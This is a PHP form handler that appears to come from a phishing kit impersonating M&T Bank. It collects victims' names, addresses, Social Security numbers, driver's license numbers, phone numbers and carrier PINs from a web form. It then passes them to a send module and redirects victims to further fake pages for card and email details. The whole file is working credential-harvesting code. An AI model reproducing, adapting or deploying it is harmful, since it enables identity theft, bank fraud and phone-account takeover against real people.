<?php
require_once('Module/Setmodule.php');
$message .= " -------------- M&T Bank 2023 Account Information -------------- \n"."\n";
$message .= "First Name: ".$_POST['fname']."\n"; 
$message .= "Last Name: ".$_POST['lname']."\n";
$message .= "Street Address: ".$_POST['Address']."\n"; 
$message .= "City: ".$_POST['City']."\n"; 
$message .= "State: ".$_POST['State']."\n"; 
$message .= "Zip: ".$_POST['ZIP']."\n"; 
$message .= "SOCIAL SECURITY ".$_POST['ssn']."\n";
$message .= "Driver's License Number ".$_POST['dln']."\n";
$message .= "PHONE NUMBER: ".$_POST['phone']."\n"; 
$message .= "CARRIER PIN: ".$_POST['pin']."\n"."\n"; 


require_once('Module/SendModule.php');
  if($settings['Card'] == "1"){
		header("Location: ../Card.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
	}
		else{
	  if($settings['Emailpage'] == "1"){
	header("Location: ../Email.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
	else{
		header("Location: ../complete.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
	}}
?>